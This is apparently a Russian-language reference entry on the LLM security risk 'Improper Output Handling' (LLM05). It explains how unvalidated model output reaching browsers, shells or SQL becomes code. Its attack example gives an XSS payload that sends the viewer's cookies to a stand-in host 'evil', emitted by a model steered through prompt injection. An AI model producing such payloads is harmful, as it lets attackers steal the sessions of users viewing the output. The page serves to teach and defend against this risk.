# LLM05 — Improper Output Handling

| | |
|---|---|
| **Код** | `LLM05` |
| **English** | Improper Output Handling |
| **Русский** | Неправильная обработка вывода |

## Суть

Ответ модели **без валидации и санитизации** попадает в downstream: HTML/JS в браузере, shell-команды, SQL, markdown с активным содержимым. Риск не в «токсичных словах», а в **небезопасном использовании текста как кода или разметки**.

## Пример атаки

Чат-бот вставляет ответ LLM в innerHTML. Модель (или атакующий через инъекцию) возвращает `<img src=x onerror=fetch('https://evil/?c='+document.cookie)>`. XSS у жертвы, просматривающей ответ.

В матрице также отмечен сценарий вредного/токсичного контента (модерация).
